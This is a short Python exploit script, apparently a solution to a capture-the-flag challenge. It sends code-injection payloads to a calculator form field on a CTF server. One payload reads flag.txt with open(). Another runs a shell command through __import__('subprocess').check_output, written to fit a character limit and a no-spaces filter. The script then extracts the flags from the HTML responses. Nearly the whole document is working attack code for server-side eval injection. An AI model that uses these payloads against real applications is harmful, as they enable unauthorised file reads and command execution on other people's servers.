#!/usr/bin/env python3
import requests
from base64 import b64decode
import re

def exploit():
    # url = "http://127.0.0.1:1337"
    url = "https://ctf.bbordes.fr"

    # no spaces allowed
    f1command = "open('flag.txt').read()"

    # only gives the exitcode (0)
    # f2command = "__import__('os').system('whoami').strip()"

    # 47 char long out of 50 allowed
    f2command = "__import__('subprocess').check_output('whoami')"

    req1 = requests.post(url, data = {'calculation': f1command})
    req2 = requests.post(url, data = {'calculation': f2command})

    print("flag1:")
    # print(b64decode(req1.headers["User-Agent"]).decode('utf-8'))
    print("flag2:")
    print(req1.text)
    print(re.findall(r'(?<=<li>)(.*?)(?=<\/li>)', req1.text)[0])
    print("\nflag3:")
    print(req2.text)
    print(re.findall(r'(?<=<li>)(.*?)(?=<\/li>)', req2.text)[0])

if __name__ == "__main__":
    exploit()
